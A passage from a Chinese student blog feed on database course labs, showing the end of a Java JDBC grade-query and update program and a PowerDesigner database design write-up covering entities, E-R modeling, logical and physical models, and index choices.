System.out.printf(<span class="hljs-string">&quot;|%-8d&quot;</span>, c2);<br>                    System.out.printf(<span class="hljs-string">&quot;|%-8d&quot;</span>, c3);<br>                    System.out.print(<span class="hljs-string">&quot;|\n&quot;</span>);<br>                &#125; <span class="hljs-keyword">while</span> (result.next());<br>                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; i &lt;= <span class="hljs-number">4</span> + <span class="hljs-number">8</span> * <span class="hljs-number">3</span> + <span class="hljs-number">16</span> + <span class="hljs-number">1</span>; i++) &#123;<br>                    System.out.print(<span class="hljs-string">&quot;-&quot;</span>);<br>                &#125;<br>                System.out.print(<span class="hljs-string">&#x27;\n&#x27;</span>);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                System.out.printf(<span class="hljs-string">&quot;课程 %s 不存在!\n&quot;</span>,Cno);<br>            &#125;<br>            <span class="hljs-comment">//释放资源</span><br>            pstmt.close();<br>            result.close();<br>            conn.close();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// 根据用户的要求修改其中某些记录的成绩字段</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">UpdateOne</span><span class="hljs-params">(String Sno, Integer Cno, Integer Grade)</span> &#123;<br>        <span class="hljs-comment">// 建立连接</span><br>        <span class="hljs-type">Connection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> C3P0Util.getConnection();<br>        <span class="hljs-comment">// 查询语句，一个变量待定</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;update SC set Grade = ? where Sno = ? and Cno = ?&quot;</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// 预处理接口</span><br>            <span class="hljs-type">PreparedStatement</span> <span class="hljs-variable">pstmt</span> <span class="hljs-operator">=</span> conn.prepareStatement(sql);<br>            <span class="hljs-comment">// 填入变量</span><br>            pstmt.setInt(<span class="hljs-number">1</span>, Grade);<br>            pstmt.setString(<span class="hljs-number">2</span>,Sno);<br>            pstmt.setInt(<span class="hljs-number">3</span>,Cno);<br>            <span class="hljs-comment">//执行sql语句，得到结果</span><br>            <span class="hljs-type">int</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> pstmt.executeUpdate();<br>            <span class="hljs-comment">//没有查询结果</span><br>            <span class="hljs-keyword">if</span>(result==<span class="hljs-number">0</span>)<br>                System.out.println(<span class="hljs-string">&quot;该学生不存在&quot;</span>);<br>            <span class="hljs-keyword">else</span> &#123;<br>                System.out.println(<span class="hljs-string">&quot;更新成功&quot;</span>);<br>                <span class="hljs-comment">// 输出更新后的课程信息</span><br>                QueryOne(Cno);<br>            &#125;<br>            <span class="hljs-comment">//释放资源</span><br>            pstmt.close();<br>            conn.close();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h4 id="主函数"><a href="#主函数" class="headerlink" title="主函数"></a>主函数</h4><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">run</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//程序执行状态</span><br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">flag</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;<br>        <span class="hljs-comment">//监视输入</span><br>        <span class="hljs-type">Scanner</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br>        <span class="hljs-keyword">while</span> (flag) &#123;<br>            <span class="hljs-comment">//初始界面</span><br>            System.out.println(<span class="hljs-string">&quot;请选择要执行的操作:&quot;</span>);<br>            System.out.println(<span class="hljs-string">&quot;1:查询某一门课程的信息&quot;</span>);<br>            System.out.println(<span class="hljs-string">&quot;2:查询选修某一门课程的选课信息/修改某一课程的成绩&quot;</span>);<br>            System.out.println(<span class="hljs-string">&quot;3:退出程序&quot;</span>);<br>            <span class="hljs-comment">//操作</span><br>            <span class="hljs-type">int</span> <span class="hljs-variable">op</span> <span class="hljs-operator">=</span> in.nextInt();<br>            <span class="hljs-keyword">if</span> (op == <span class="hljs-number">1</span>) &#123;<br>                <span class="hljs-comment">// 显示课程号 课程名</span><br>                CourseDao.showCname();<br>                System.out.println(<span class="hljs-string">&quot;请在下方选择需要查询的课程编号:&quot;</span>);<br>                <span class="hljs-type">int</span> <span class="hljs-variable">Cno</span> <span class="hljs-operator">=</span> in.nextInt();<br>                CourseDao.QueryOne(Cno);<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (op == <span class="hljs-number">2</span>) &#123;<br>                <span class="hljs-comment">// 显示课程号 课程名</span><br>                CourseDao.showCname();<br>                System.out.println(<span class="hljs-string">&quot;请在下方选择需要查询选课信息的课程编号:&quot;</span>);<br>                <span class="hljs-type">int</span> <span class="hljs-variable">Cno</span> <span class="hljs-operator">=</span> in.nextInt();<br>                SCDao.QueryOne(Cno);<br>                System.out.println(<span class="hljs-string">&quot;是否要修改该课程某一学生的成绩？&quot;</span>);<br>                System.out.println(<span class="hljs-string">&quot;1:是&quot;</span>);<br>                System.out.println(<span class="hljs-string">&quot;其它:返回主页面&quot;</span>);<br>                <span class="hljs-type">int</span> <span class="hljs-variable">op2</span> <span class="hljs-operator">=</span> in.nextInt();<br>                <span class="hljs-keyword">while</span> (op2 == <span class="hljs-number">1</span>) &#123;<br>                    System.out.print(<span class="hljs-string">&quot;请输入学号：&quot;</span>); <span class="hljs-comment">//：</span><br>                    <span class="hljs-type">String</span> <span class="hljs-variable">Sno</span> <span class="hljs-operator">=</span> in.next();<br>                    System.out.print(<span class="hljs-string">&quot;请输入成绩：&quot;</span>); <span class="hljs-comment">//</span><br>                    <span class="hljs-type">int</span> <span class="hljs-variable">Grade</span> <span class="hljs-operator">=</span> in.nextInt();<br>                    SCDao.UpdateOne(Sno, Cno, Grade);<br>                    System.out.println(<span class="hljs-string">&quot;是否要继续修改该课程某一学生的成绩？&quot;</span>); <span class="hljs-comment">//</span><br>                    System.out.println(<span class="hljs-string">&quot;1:是&quot;</span>);<br>                    System.out.println(<span class="hljs-string">&quot;其它:返回主页面&quot;</span>);<br>                    op2 = in.nextInt();<br>                &#125;<br><br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (op == <span class="hljs-number">3</span>) &#123;<br>                flag = <span class="hljs-literal">false</span>;<br>                System.out.println(<span class="hljs-string">&quot;程序即将退出！&quot;</span>);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                System.out.println(<span class="hljs-string">&quot;请输入正确的命令&quot;</span>);<br>            &#125;<br><br>        &#125;<br><br><br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>数据库系统课程实验</category>
      
    </categories>
    
    
    <tags>
      
      <tag>数据库系统实验</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>《数据库系统概论》课程之实验五 数据库设计实验</title>
    <link href="/2022/05/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%BA%94%20%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%BE%E8%AE%A1%E5%AE%9E%E9%AA%8C/"/>
    <url>/2022/05/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%BA%94%20%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%BE%E8%AE%A1%E5%AE%9E%E9%AA%8C/</url>
    
    <content type="html"><![CDATA[<h1 id="《数据库系统概论》课程之实验五-数据库设计实验"><a href="#《数据库系统概论》课程之实验五-数据库设计实验" class="headerlink" title="《数据库系统概论》课程之实验五 数据库设计实验"></a>《数据库系统概论》课程之实验五 数据库设计实验</h1><h2 id="1-实验目的"><a href="#1-实验目的" class="headerlink" title="1. 实验目的"></a>1. 实验目的</h2><p>掌握数据库设计基本方法及数据库设计工具。</p><h2 id="2-实验平台和工具"><a href="#2-实验平台和工具" class="headerlink" title="2. 实验平台和工具"></a>2. 实验平台和工具</h2><p>利用Power Designer数据库设计工具设计该数据库。</p><h2 id="3-实验内容和要求"><a href="#3-实验内容和要求" class="headerlink" title="3. 实验内容和要求"></a>3. 实验内容和要求</h2><p>掌握数据库设计基本步骤，包括数据库概念结构设计、逻辑结构设计、物理结构设计，数据库模式SQL语句生成。能够使用数据库设计工具进行数据库设计。</p><p>设计一个采购、销售和客户管理应用数据库。其中，一个供应商可以供应多种零件，一种零件也可以有多个供应商。一个客户订单可以订购多种供应商供应的零件。客户和供应商都分属于不同的国家，而国家按世界五大洲八大洋划分地区。请利用Power Designer数据库设计工具设计该数据库。</p><h3 id="（1）数据库概念结构设计"><a href="#（1）数据库概念结构设计" class="headerlink" title="（1）数据库概念结构设计"></a>（1）数据库概念结构设计</h3><p>识别出<code>零件Part、供应商Supplier、客户Customer、订单Order、订单项Lineitem、国家Nation、地区Region</code>等7个实体。每个实体的属性、码如下。</p><ul><li><p><code>零件Part</code>：零件编号partkey、零件名称name、零件制造商mfgr、品牌brand、类型type、大小size、零售价格retailprice、包装container、备注comment。主码：零件编号 partkey。</p></li><li><p><code>供应商Supplier</code>：供应商编号suppkey、供应商名称name、地址address、国籍nation、电话phone、备注comment等。主码：供应商编号suppkey。</p></li><li><p><code>客户Customer</code>：客户编号custkey、客户名称name、地址address、电话phone、国籍nation、备注comment。主码：客户编号custkey。</p></li><li><p><code>订单Order</code>：订单编号orderkey、订单状态status、订单总价totalprice、订单日期orderdate、订单优先级orderpriority、记账员clerk、运送优先级shippriority、备注comment。主码：订单编号orderkey。</p></li><li><p><code>订单项Lineitem</code>：订单项编号linenumber、所订零件号partkey、所订零件供应商号suppkey、零件数量quantity、零件总价extendedprice、折扣discount、税率tax、退货标记returnflag等。主码：订单项编号linenumber。</p></li><li><p><code>国家Nation</code>：国家编号nationkey、国家名称name、所属地区region、备注comment。主码：国家编号nationkey。</p></li><li><p><code>地区Region</code>：地区编号regionkey、国家名称name、备注comment。主码：地区编号regionkey。</p></li></ul><p>根据实体语义，分析实体之间的联系，确定实体之间一对一，一对多和多对多联系。画出实体-联系图。</p><h4 id="E-R图："><a href="#E-R图：" class="headerlink" title="E-R图："></a>E-R图：</h4><p><img src="/2022/05/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%BA%94%20%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%BE%E8%AE%A1%E5%AE%9E%E9%AA%8C/image-20220507135026495.png" alt="image-20220507135026495"></p><h4 id="使用PowerDesigner设计概念模型"><a href="#使用PowerDesigner设计概念模型" class="headerlink" title="使用PowerDesigner设计概念模型"></a>使用PowerDesigner设计概念模型</h4><ul><li><p>新建概念模型</p><p><img src="/2022/05/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%BA%94%20%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%BE%E8%AE%A1%E5%AE%9E%E9%AA%8C/image-20220507104734401.png" alt="image-20220507104734401" style="zoom:67%;"></p></li><li><p>“工具”-“Model Options”修改“Notation”</p><p><img src="/2022/05/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%BA%94%20%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%BE%E8%AE%A1%E5%AE%9E%E9%AA%8C/image-20220507105320883.png" alt="image-20220507105320883" style="zoom:67%;"></p></li><li><p>添加实体</p><p><img src="/2022/05/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%BA%94%20%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%BE%E8%AE%A1%E5%AE%9E%E9%AA%8C/image-20220507105503374.png" alt="image-20220507105503374" style="zoom:67%;"></p></li><li><p>双击实体，填充实体信息和字段。以“零件”为例：</p><p><img src="/2022/05/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%BA%94%20%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%BE%E8%AE%A1%E5%AE%9E%E9%AA%8C/image-20220507110628771.png" alt="image-20220507110628771" style="zoom:67%;"></p><p><img src="/2022/05/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%BA%94%20%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%BE%E8%AE%A1%E5%AE%9E%E9%AA%8C/image-20220507110649799.png" alt="image-20220507110649799" style="zoom:67%;"></p><p><img src="/2022/05/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%BA%94%20%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%BE%E8%AE%A1%E5%AE%9E%E9%AA%8C/image-20220507111911066.png" alt="image-20220507111911066"></p><ul><li>字段勾选“P”后，\<pi\>代表主键</pi\></li></ul></li><li><p>完成所有实体的信息填充后，在“Palette”选取“Relationship”，为实体间创建联系。编辑“Relationship”的连线，以“零件”——“供应商”（m:n联系）为例：</p><p><img src="/2022/05/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%BA%94%20%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%BE%E8%AE%A1%E5%AE%9E%E9%AA%8C/image-20220507124749370.png" alt="image-20220507124749370" style="zoom:67%;"></p><p><img src="/2022/05/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%BA%94%20%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%BE%E8%AE%A1%E5%AE%9E%E9%AA%8C/image-20220507124822841.png" alt="image-20220507124822841" style="zoom:67%;"></p><ul><li>供应商to零件：0,n，表示一个供应商对应0~n个零件</li><li>零件to供应商：1,n，表示一个零件对应1~n个供应商</li></ul></li><li><p>其他联系如下：</p><p>零件:供应商:订单项 —— 1:1:n</p><p>订单:订单项 —— 1:n</p><p>客户:订单 —— 1:n</p><p>国家:客户 —— 1:n</p><p>国家:供应商 —— 1:n</p><p>地区:国家 —— 1:n</p></li></ul><blockquote><p><code>注意</code>：受PowerDesigner的限制，无法在概念模型添加零件:供应商:订单项的1:1:n关系。这需要在逻辑数据模型中零件:供应商的m:n关系转化完成后，进行添加关系。</p></blockquote><ul><li><p>设计的概念模型如下：</p><p><img src="/2022/05/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%BA%94%20%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%BE%E8%AE%A1%E5%AE%9E%E9%AA%8C/image-20220507153822372.png" alt="image-20220507153822372"></p><ul><li>注意国籍、所属地区应该为int型，和国家编号、地区编号相对应。</li></ul></li></ul><h3 id="（2）数据库逻辑结构设计"><a href="#（2）数据库逻辑结构设计" class="headerlink" title="（2）数据库逻辑结构设计"></a>（2）数据库逻辑结构设计</h3><p>按照数据库设计原理中概念结构转化成逻辑结构的规则，每个实体转换成一个关系，多对多的联系也转换成一个关系。因此，根据上述画出的E-R图设计数据库逻辑结构。</p><h4 id="使用PowerDesigner生成逻辑模型"><a href="#使用PowerDesigner生成逻辑模型" class="headerlink" title="使用PowerDesigner生成逻辑模型"></a>使用PowerDesigner生成逻辑模型</h4><ul><li>在概念模型的基础上，点击“工具”——“Generate Logical Data Model”生成逻辑数据模型：</li></ul><p>  <img src="/2022/05/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%BA%94%20%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%BE%E8%AE%A1%E5%AE%9E%E9%AA%8C/image-20220507135552001.png" alt="image-20220507135552001" style="zoom:67%;"></p><ul><li><p>配置选项后，点击“确定”</p><p><img src="/2022/05/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%BA%94%20%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%BE%E8%AE%A1%E5%AE%9E%E9%AA%8C/image-20220507140954144.png" alt="image-20220507140954144" style="zoom:67%;"></p></li><li><p>效果如下，可以看见自动生成了外键\<fi\>：</fi\></p></li></ul><p><img src="/2022/05/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%BA%94%20%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%BE%E8%AE%A1%E5%AE%9E%E9%AA%8C/image-20220507153954457.png" alt="image-20220507153954457"></p><ul><li><p>供应商、客户、国家都产生了额外的外键，我们需要把新生成的外键删除，然后进行更正：<img src="/2022/05/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%BA%94%20%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%BE%E8%AE%A1%E5%AE%9E%E9%AA%8C/image-20220507151638928.png" alt="image-20220507151638928" style="zoom:67%;"></p><p><img src="/2022/05/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%BA%94%20%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%BE%E8%AE%A1%E5%AE%9E%E9%AA%8C/image-20220507151455232.png" alt="image-20220507151455232" style="zoom: 67%;"> <img src="/2022/05/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%BA%94%20%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%BE%E8%AE%A1%E5%AE%9E%E9%AA%8C/image-20220507151526656.png" alt="image-20220507151526656" style="zoom:67%;"></p></li><li><p>可以看见零件:供应商的m:n关系单独转化成了一个关系模式“供应”。</p></li><li><p>故添加概念模型中没有建立的关系（订单项和供应），最终效果如下：</p></li></ul><h4 id="逻辑数据模型"><a href="#逻辑数据模型" class="headerlink" title="逻辑数据模型"></a>逻辑数据模型</h4><p><img src="/2022/05/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%BA%94%20%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%BE%E8%AE%A1%E5%AE%9E%E9%AA%8C/image-20220507154132086.png" alt="image-20220507154132086"></p><h3 id="（3）数据库物理结构设计"><a href="#（3）数据库物理结构设计" class="headerlink" title="（3）数据库物理结构设计"></a>（3）数据库物理结构设计</h3><p>数据库物理结构首先根据逻辑结构自动转换生成，然后根据应用需求设计数据库的索引结构、存储结构。</p><h4 id="使用PowerDesigner生成物理结构"><a href="#使用PowerDesigner生成物理结构" class="headerlink" title="使用PowerDesigner生成物理结构"></a>使用PowerDesigner生成物理结构</h4><ul><li><p>在逻辑模型的基础上，点击“工具”——“Generate Physical Data Model”生成物理数据模型：</p><p><img src="/2022/05/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%BA%94%20%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%BE%E8%AE%A1%E5%AE%9E%E9%AA%8C/image-20220507140234223.png" alt="image-20220507140234223" style="zoom:67%;"></p></li><li><p>这里选取的数据库管理系统为<code>Microsoft SQL Server 2012</code> （发现这里不支持<code>MySQL8.0,</code>而<code>MySQL5.0</code>的物理模型编辑不了索引的存储方法，虽然<code>Microsoft SQL Server 2012</code>也没好到哪去）</p><p><img src="/2022/05/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%BA%94%20%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%BE%E8%AE%A1%E5%AE%9E%E9%AA%8C/image-20220507142327596.png" alt="image-20220507142327596" style="zoom:67%;"></p></li><li><p>效果如下</p><p><img src="/2022/05/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%BA%94%20%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%BE%E8%AE%A1%E5%AE%9E%E9%AA%8C/image-20220507154221948.png" alt="image-20220507154221948"></p></li></ul><h4 id="设计数据库的索引结构"><a href="#设计数据库的索引结构" class="headerlink" title="设计数据库的索引结构"></a>设计数据库的索引结构</h4><ul><li><p>双击一张表，选择“Indexes”，新建一个索引，点击左上角的“Index Properties”</p><p><img src="/2022/05/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%BA%94%20%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%BE%E8%AE%A1%E5%AE%9E%E9%AA%8C/image-20220507141633500.png" alt="image-20220507141633500" style="zoom:67%;"></p></li><li><p>“Index Properties”中选择“Column”，添加属性…在Sort中选择存储方法，发现只支持2个方法（升序和降序）</p><p>（PowerDesigner不太行!）</p><p><img src="/2022/05/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%BA%94%20%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%BE%E8%AE%A1%E5%AE%9E%E9%AA%8C/image-20220507143758512.png" alt="image-20220507143758512"></p></li></ul><blockquote><p>其他存储方法如下</p></blockquote><h5 id="B-树索引存取方法"><a href="#B-树索引存取方法" class="headerlink" title="B+树索引存取方法"></a>B+树索引存取方法</h5><ul><li><p>如果一个（或一组）属性经常在<strong>查询条件</strong>中出现，则考虑在这个（或这组）属性上建立索引（或组合索引）</p><ul><li>如本实验中，订单项的“退货标记”，订单的“客户编号”、“订单状态”、“订单日期”。</li></ul></li><li><p>如果一个属性经常作为<strong>最大值和最小值等聚集函数</strong>的参数，则考虑在这个属性上建立索引</p><ul><li>如本实验中，订单的“订单优先级”、“运送优先级”。</li></ul></li><li><p>如果一个（或一组）属性经常在<strong>连接操作的连接条件</strong>中出现，则考虑在这个（或这组）属性上建立索引</p><ul><li>如本实验中，作为其他关系模式外键的属性：零件的“零件编号”、供应商的“供应商编号”、客户的“客户编号”、国家的“国家编号”、地区的“地区编号”。</li></ul></li></ul><h5 id="HASH存取方法"><a href="#HASH存取方法" class="headerlink" title="HASH存取方法"></a>HASH存取方法</h5><ul><li>如果一个关系的属性主要出现在<strong>等值连接</strong>条件中或主要出现在<strong>等值比较</strong>选择条件中，而且满足下列两个条件之一<ul><li>该关系的大小可预知，而且不变； </li><li>该关系的大小动态改变，但所选用的数据库管理系统提供了动态Hash存取方法</li></ul></li></ul><p>这与上述<strong>B+树索引存取方法</strong>中第3点<strong>连接操作的连接条件</strong>基本一致。</p><h5 id="聚簇存取方法"><a href="#聚簇存取方法" class="headerlink" title="聚簇存取方法"></a>聚簇存取方法</h5><p>为了提高某个属性（或属性组）的查询速度，把这个或这些属性（称为聚簇码）上<strong>具有相同值的元组</strong>集中存放在连续的物理块中称为聚簇</p><p>本实验中，零件的“零件制造商”、“品牌”、“类型”，订单的“订单日期”、“记账员”，客户的“国籍”、供应商的“国籍”、国家的“所在地区”等可以使用聚簇存取。</p><h3 id="（4）数据库模式SQL语句生成"><a href="#（4）数据库模式SQL语句生成" class="headerlink" title="（4）数据库模式SQL语句生成"></a>（4）数据库模式SQL语句生成</h3><p>这里生成MySQL5.0的SQL语句。</p><ul><li><p>点击“数据库”——“生成数据库”</p><p><img src="/2022/05/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%BA%94%20%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%BE%E8%AE%A1%E5%AE%9E%E9%AA%8C/image-20220507152224409.png" alt="image-20220507152224409" style="zoom:67%;"></p></li><li><p>选择存储路径后，点击确定生成SQL语句的文件:</p><p><img src="/2022/05/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%BA%94%20%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%BE%E8%AE%A1%E5%AE%9E%E9%AA%8C/image-20220507154425858.png" alt="image-20220507154425858" style="zoom:67%;"></p></li><li><p>内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs 